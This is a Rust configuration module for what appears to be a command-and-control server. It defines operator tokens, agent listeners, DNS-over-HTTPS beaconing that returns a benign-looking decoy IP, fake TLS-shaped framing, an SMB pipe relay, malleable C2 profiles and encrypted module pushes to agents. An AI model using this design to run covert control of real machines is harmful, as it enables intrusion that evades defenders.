//! Server configuration loaded from a TOML file or built with defaults.

use common::normalized_transport::TrafficProfile;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::net::SocketAddr;
use std::path::PathBuf;

/// A single operator identity loaded from the `[operators]` TOML section.
///
/// Each operator has their own bearer token, which is stored as a SHA-256
/// hash and compared in constant time during authentication.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OperatorConfig {
    /// Human-readable name (shown in audit logs and the dashboard).
    pub name: String,
    /// Bearer token presented by this operator.  Stored as a SHA-256 hex
    /// digest at load time — the plaintext is never retained.
    pub token: String,
    /// Comma-separated permission flags.  Currently informational; all
    /// authenticated operators have full access.  Reserved for future RBAC.
    #[serde(default)]
    pub permissions: Vec<String>,
}

/// Resolved operator record used at runtime by the auth middleware.
#[derive(Debug)]
pub struct OperatorRecord {
    pub id: String,
    pub name: String,
    /// SHA-256 hash of the bearer token (hex-encoded).
    pub token_hash: String,
    pub permissions: Vec<String>,
    pub last_seen: std::sync::atomic::AtomicU64,
}

impl Clone for OperatorRecord {
    fn clone(&self) -> Self {
        Self {
            id: self.id.clone(),
            name: self.name.clone(),
            token_hash: self.token_hash.clone(),
            permissions: self.permissions.clone(),
            last_seen: std::sync::atomic::AtomicU64::new(
                self.last_seen.load(std::sync::atomic::Ordering::Relaxed),
            ),
        }
    }
}

impl OperatorRecord {
    /// Compute a SHA-256 hex digest of a bearer token.
    pub fn hash_token(token: &str) -> String {
        use sha2::Digest;
        let mut hasher = sha2::Sha256::new();
        hasher.update(token.as_bytes());
        hex::encode(hasher.finalize())
    }

    /// Build an `OperatorRecord` from a config entry, assigning the given id.
    pub fn from_config(id: &str, cfg: &OperatorConfig) -> Self {
        Self {
            id: id.to_string(),
            name: cfg.name.clone(),
            token_hash: Self::hash_token(&cfg.token),
            permissions: cfg.permissions.clone(),
            last_seen: std::sync::atomic::AtomicU64::new(0),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ServerConfig {
    /// Address the HTTPS dashboard / REST API listens on.
    pub http_addr: SocketAddr,
    /// Address the agent (AES-TCP) listener binds to.
    pub agent_addr: SocketAddr,
    /// Pre-shared secret used to derive the AES-256 key for the agent channel.
    /// In production this should be replaced by mTLS; see roadmap.
    pub agent_shared_secret: String,
    /// Optional server-side traffic shaping profile for the agent channel.
    ///
    /// `None` (default) disables shaping and keeps the listener in raw framed
    /// mode. Set to `"tls"` to accept fake TLS-shaped framing from agents.
    #[serde(default)]
    pub agent_traffic_profile: Option<TrafficProfile>,
    /// Bearer token operators must present in `Authorization: Bearer ...`.
    pub admin_token: String,
    /// Path to a JSON-Lines audit log (created if missing, append-only).
    pub audit_log_path: PathBuf,
    /// Optional TLS certificate (PEM). If `None`, a self-signed cert is
    /// generated in-memory at startup and printed to the log.
    pub tls_cert_path: Option<PathBuf>,
    /// Optional TLS private key (PEM).
    pub tls_key_path: Option<PathBuf>,
    /// Filesystem path to the static dashboard assets directory.
    pub static_dir: PathBuf,
    #[serde(default = "default_builds_dir")]
    pub builds_output_dir: PathBuf,
    #[serde(default = "default_build_retention_days")]
    pub build_retention_days: u32,
    #[serde(default = "default_max_concurrent_builds")]
    pub max_concurrent_builds: usize,
    /// How long (seconds) to wait for an agent to reply before timing out a command.
    #[serde(default = "default_command_timeout")]
    pub command_timeout_secs: u64,
    /// Enable the DNS-over-HTTPS bridge listener.
    #[serde(default)]
    pub doh_enabled: bool,
    /// Address the DoH listener binds to.
    #[serde(default = "default_doh_listen_addr")]
    pub doh_listen_addr: SocketAddr,
    /// Domain suffix expected in DoH query names.
    #[serde(default = "default_doh_domain")]
    pub doh_domain: String,
    /// Sentinel IP returned for beacon A queries when tasking is available.
    #[serde(default = "default_doh_beacon_sentinel")]
    pub doh_beacon_sentinel: String,
    /// Benign-looking IP returned for beacon A queries when no tasking exists.
    #[serde(default = "default_doh_idle_ip")]
    pub doh_idle_ip: String,
    // ── Mutual TLS (agent channel) ─────────────────────────────────────────
    /// When `true`, the agent-facing TCP listener requires client certificates.
    /// Defaults to `false` for backward compatibility.
    #[serde(default)]
    pub mtls_enabled: bool,
    /// Path to a PEM-encoded CA certificate used to verify agent client certs.
    /// Required when `mtls_enabled = true`.
    #[serde(default)]
    pub mtls_ca_cert_path: Option<PathBuf>,
    /// Allowed Common Names in agent client certificates.  When non-empty,
    /// only agents whose cert CN appears in this list are accepted.
    #[serde(default)]
    pub mtls_allowed_cns: Vec<String>,
    /// Allowed Organizational Units in agent client certificates.  When
    /// non-empty, the client cert's OU must appear in this list.
    #[serde(default)]
    pub mtls_allowed_ous: Vec<String>,
    // ── Module signing ──────────────────────────────────────────────────
    /// Ed25519 signing key for module binaries.  Base64-encoded 32-byte
    /// seed (the same format produced by `keygen --module-signing-key`).
    /// When set, any module pushed to an agent via `ModulePush` is signed
    /// before encryption.  The agent verifies the signature against its
    /// embedded (or configured) Ed25519 public key before loading.
    #[serde(default)]
    pub module_signing_key: Option<String>,
    /// AES-256 key used to encrypt module blobs pushed to agents.
    /// Base64-encoded 32 bytes — must match the `module_aes_key` configured
    /// on every agent that will receive pushed modules.
    #[serde(default)]
    pub module_aes_key: Option<String>,
    /// Directory where module binaries (`.so` / `.dll`) are stored for
    /// C2-tunneled downloads.  When an agent sends a [`ModuleRequest`],
    /// the server looks up `<modules_dir>/<module_id>.<ext>` here.
    /// Defaults to a `modules` subdirectory of `builds_output_dir`.
    #[serde(default = "default_modules_dir")]
    pub modules_dir: PathBuf,
    // ── Multi-operator support ─────────────────────────────────────────
    /// Named operators loaded from the `[operators]` TOML map.
    /// Each entry key becomes the operator ID; the sub-table contains
    /// `name`, `token`, and optional `permissions`.
    ///
    /// Example TOML:
    /// ```toml
    /// [operators.alice]
    /// name = "Alice (lead)"
    /// token = "secret-bearer-token-for-alice"
    ///
    /// [operators.bob]
    /// name = "Bob"
    /// token = "secret-bearer-token-for-bob"
    /// permissions = ["read"]
    /// ```
    #[serde(default)]
    pub operators: HashMap<String, OperatorConfig>,
    // ── SMB named-pipe relay ───────────────────────────────────────────────
    /// Enable the server-side SMB named-pipe relay.  The relay creates a
    /// Windows named pipe and bridges each connection to the agent TCP
    /// listener.  On non-Windows platforms this compiles to a no-op stub.
    #[serde(default)]
    pub smb_relay_enabled: bool,
    /// Name of the pipe to create (without the `\\.\pipe\` prefix).
    /// Defaults to the compile-time randomised constant from `common::ioc::IOC_PIPE_NAME`.
    #[serde(default = "default_smb_relay_pipe_name")]
    pub smb_relay_pipe_name: String,
    /// Maximum number of concurrent pipe instances.  Defaults to 4.
    #[serde(default = "default_smb_relay_max_instances")]
    pub smb_relay_max_instances: u32,
    // ── Malleable C2 HTTP listener ─────────────────────────────────────────
    /// Address for the malleable-profile-aware HTTP C2 listener.
    ///
    /// This is a separate listener from the operator HTTPS dashboard.
    /// Agents connect here using their profile-configured URIs.
    #[serde(default = "default_http_c2_addr")]
    pub http_c2_addr: SocketAddr,
    /// Path to a directory of malleable C2 profile TOML files.
    ///
    /// When set, the server loads all `.toml` files in this directory
    /// at startup and watches for changes every 30 seconds.
    #[serde(default)]
    pub profile_dir: Option<PathBuf>,
    /// Path to a single malleable C2 profile file (backward compat).
    #[serde(default)]
    pub profile_path: Option<PathBuf>,
}

fn default_builds_dir() -> PathBuf {
    PathBuf::from("/var/lib/orchestra/builds")
}

fn default_modules_dir() -> PathBuf {
    default_builds_dir().join("modules")
}
fn default_build_retention_days() -> u32 {
    7
}
fn default_max_concurrent_builds() -> usize {
    1
}
fn default_command_timeout() -> u64 {
    30
}
fn default_doh_listen_addr() -> SocketAddr {
    "127.0.0.1:8445".parse().unwrap()
}
fn default_doh_domain() -> String {
    "c2.example.com".to_string()
}
fn default_doh_beacon_sentinel() -> String {
    "1.2.3.4".to_string()
}
fn default_doh_idle_ip() -> String {
    "104.18.5.22".to_string()
}
fn default_smb_relay_pipe_name() -> String {
    common::ioc::IOC_PIPE_NAME.to_string()
}
fn default_smb_relay_max_instances() -> u32 {
    4
}
fn default_http_c2_addr() -> SocketAddr {
    "127.0.0.1:8446".parse().unwrap()
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            http_addr: "127.0.0.1:8443".parse().unwrap(),
            agent_addr: "127.0.0.1:8444".parse().unwrap(),
            agent_shared_secret: "change-me-pre-shared-secret".into(),
            agent_traffic_profile: None,
            admin_token: "change-me-admin-token".into(),
            audit_log_path: PathBuf::from("orchestra-audit.jsonl"),
            tls_cert_path: None,
            tls_key_path: None,
            static_dir: PathBuf::from("orchestra-server/static"),
            builds_output_dir: default_builds_dir(),
            build_retention_days: 7,
            max_concurrent_builds: 1,
            command_timeout_secs: 30,
            doh_enabled: false,
            doh_listen_addr: default_doh_listen_addr(),
            doh_domain: default_doh_domain(),
            doh_beacon_sentinel: default_doh_beacon_sentinel(),
            doh_idle_ip: default_doh_idle_ip(),
            mtls_enabled: false,
            mtls_ca_cert_path: None,
            mtls_allowed_cns: Vec::new(),
            mtls_allowed_ous: Vec::new(),
            operators: HashMap::new(),
            module_signing_key: None,
            module_aes_key: None,
            modules_dir: default_modules_dir(),
            smb_relay_enabled: false,
            smb_relay_pipe_name: default_smb_relay_pipe_name(),
            smb_relay_max_instances: default_smb_relay_max_instances(),
            http_c2_addr: default_http_c2_addr(),
            profile_dir: None,
            profile_path: None,
        }
    }
}

impl ServerConfig {
    pub fn load(path: &std::path::Path) -> anyhow::Result<Self> {
        let body = std::fs::read_to_string(path)?;
        Ok(toml::from_str(&body)?)
    }
}
